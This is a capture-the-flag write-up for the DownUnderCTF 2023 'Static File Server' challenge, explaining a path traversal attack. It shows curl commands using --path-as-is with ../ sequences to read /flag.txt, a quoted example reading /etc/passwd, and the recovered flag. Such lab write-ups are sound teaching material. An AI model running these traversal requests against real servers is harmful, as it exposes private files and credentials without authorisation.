# Static File Server


## Description

Here's a simple Python app that lets you view some files on the server.

Author: joseph

Application: [https://web-static-file-server-9af22c2b5640.2023.ductf.dev](https://web-static-file-server-9af22c2b5640.2023.ductf.dev/)<br>
Downloads: [static-file-server.zip](https://play.duc.tf/files/72096b2308e1e1565d2b894f268226cd/static-file-server.zip?token=eyJ1c2VyX2lkIjoyNDI4LCJ0ZWFtX2lkIjoxMjc1LCJmaWxlX2lkIjoxMDJ9.ZPRDyA.FppA_1YAkl10N8Zk3prVVnq2jdU)

## Analysis

Application is not much, it has 2 files and you can visit them. When I play around challenges I first try black box testing and then white box testing. Most application you will encounter will be black box type, meaning you don't have the source code, just application.

With that let's visit link shown on website: [not the flag](https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/not_the_flag.txt):

```html
The real flag is at /flag.txt
```

If you have encountered this types of challenges then [Path traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion) should be the first thing you try.

Request: 
```
http://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/../../../../../../flag.txt
```

Respone:
```
URL: https://web-static-file-server-9af22c2b5640.2023.ductf.dev/flag.txt
Content: 404: Not Found
```

Browser is   doing something unwanted,  its  discarding `../` and translates path as relative.

Let's fix that with cUrl: [man page](https://curl.se/docs/manpage.html)

```
--path-as-is
	
	Tell curl to not handle sequences of /../ or /./ in the given URL path. Normally curl will squash or merge them according to standards but with this option set you tell it not to do that.

	Providing --path-as-is multiple times has no extra effect. Disable it again with --no-path-as-is.

	Example:
		curl --path-as-is https://example.com/../../etc/passwd
```

## Solution

```bash
➜ curl https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/../../../../flag.txt --path-as-is
DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}
```

::: tip Flag
`DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}`
:::